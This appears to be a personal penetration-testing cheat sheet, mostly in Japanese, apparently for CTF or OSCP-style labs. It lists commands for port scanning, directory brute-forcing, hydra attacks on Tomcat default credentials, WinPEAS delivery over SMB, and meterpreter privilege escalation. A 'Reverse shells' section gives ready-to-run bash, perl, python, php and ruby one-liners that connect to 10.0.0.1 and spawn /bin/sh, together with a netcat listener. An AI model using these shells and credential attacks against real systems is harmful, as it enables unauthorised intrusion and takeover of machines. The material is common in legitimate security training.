# Cheat Sheet


## Enumeration
### nmap
- 全ポートスキャン: `nmap -sS -A -T4 -Pn -p- $IP`
- 特定ポートのチェック: `nmap -sS -A -p[port] --script vuln $IP`

### rustscan
- installation: `sudo snap install -y rustscan`
- 全ポートスキャン: `rustscan -a $IP --ulimit 10000 -- -Pn -A --script vuln > rustscan.log`

### gobuster
- ディレクトリやファイルの探索
  - `gobuster -u http://$IP -w ~/tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 50`

### ffuf
- ディレクトリやファイルの探索
- コマンド例
  - ディレクトリ検索: `ffuf`

### WinPEAS
- https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
- Win系OSのサーバの情報をとる
- 手順
  1. SMB サーバを立てて WinPEAS のあるディレクトリを公開 `sudo python3 ~/tools/impacket/examples/smbserver.py share .`
  2. リモートでダウンロード: `copy \\10.10.14.23\share\x64\Release\winPEASx64.exe`
  3. winPEAS を実行: `./winPEAS.exe`


## Password Cracking
### hydra
- webサービスで総当たりする
- Basic認証総当たり(`user:pass`形式のコーパス): `hydra -C ~/tools/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-post://$IP:8080/manager/html`


## Exploitation
### Webshell
- web上でコマンド実行できる
- https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html

### msfvenom
- metasploitのペイロードを取れる
- ペイロードの列挙: `msfvenom -l payloads`


## Privesc
### local exploit suggester
- meterpreter shell をバックグラウンドに移し、`use post/multi/recon/local_exploit_suggester` する
- sesionオプションを指定し、run 

### Windows Exploit Suggester
- `pip install xlrd==1.2.0` が必要
- `~/tools/Windows-Exploit-Suggester/windows-exploit-suggester.py --update` でデータベース更新
- `~/tools/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2021-06-07-mssb.xls --systeminfo systeminfo.txt`

### meterpreter shell
- `getprivs`: 取得可能な権限をとる
- `getsystem`
- `migrate [pid]`: 安定しているプロセスに移動するとき
- `ps`: 動いているプロセスの一覧
- `shell`: cmd.exe とかに移る
- `sysinfo`: システムの軽い情報調査



## Reverse shells
### Receiver
- `nc -lnvp 4444`

### sender
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- bash: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
- perl: `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
- python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- php: `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
- ruby: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`


## Operating System
### Windows Command Prompt
| コマンド名 | 説明 |
|---|---|
| type | ファイルの中身を見る |
| more | ファイルの中身を見る |
| whoami | whoami? |
| icacls (cacls) | ACL の表示や変更: 権限情報がわかる (https://www.atmarkit.co.jp/ait/articles/0601/28/news016.html) |
| systeminfo | OSやシステムの情報を表示 |



## File transfer
### SimpleHTTPserver
- カレントディレクトリをルートとした簡易Webサーバを立てることができる．
  - `sudo python -m SimpleHTTPServer [port]`
- 対象サーバで `<script src="http://.../a.js">`により任意の悪意のあるJavaScriptを実行させることなどが可能

### smbserver.py
- `sudo python3 ~/tools/impacket/examples/smbserver.py share .`


## Miscellaneous

### SilentTrinity
- C2 server を立てることができる
